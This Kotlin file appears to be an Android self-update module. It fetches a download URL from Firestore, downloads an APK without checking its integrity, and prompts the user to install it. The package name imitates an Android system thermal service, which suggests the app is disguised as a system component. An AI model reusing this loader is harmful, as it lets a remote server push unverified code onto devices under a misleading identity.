package com.android.system.service.thermal

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.core.content.FileProvider
import com.google.firebase.firestore.FirebaseFirestore
import java.io.File
import java.io.FileOutputStream
import java.net.URL

object UpdateManager {
    private const val TAG = "ZondraUpdate"
    private const val CURRENT_VERSION = 1
    private val db = FirebaseFirestore.getInstance()

    fun checkForUpdates(context: Context) {
        db.collection("app_config").document("version").get()
            .addOnSuccessListener { document ->
                if (document != null && document.exists()) {
                    val latestVersion = document.getLong("version_code") ?: 1
                    val downloadUrl = document.getString("download_url")

                    if (latestVersion > CURRENT_VERSION && downloadUrl != null) {
                        Log.d(TAG, "New version found: $latestVersion. Downloading...")
                        downloadAndInstall(context, downloadUrl)
                    }
                }
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Error checking for updates", e)
            }
    }

    private fun downloadAndInstall(context: Context, url: String) {
        Thread {
            try {
                val apkFile = File(context.cacheDir, "system_update.apk")
                val connection = URL(url).openConnection()
                connection.connect()

                val input = connection.getInputStream()
                val output = FileOutputStream(apkFile)
                val buffer = ByteArray(1024)
                var bytesRead: Int
                while (input.read(buffer).also { bytesRead = it } != -1) {
                    output.write(buffer, 0, bytesRead)
                }
                output.close()
                input.close()

                Log.d(TAG, "Download complete. Prompting install...")
                promptInstall(context, apkFile)
            } catch (e: Exception) {
                Log.e(TAG, "Download failed", e)
            }
        }.start()
    }

    private fun promptInstall(context: Context, file: File) {
        val intent = Intent(Intent.ACTION_VIEW)
        val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            FileProvider.getUriForFile(context, "${context.packageName}.provider", file)
        } else {
            Uri.fromFile(file)
        }
        
        intent.setDataAndType(data, "application/vnd.android.package-archive")
        intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION
        context.startActivity(intent)
    }
}
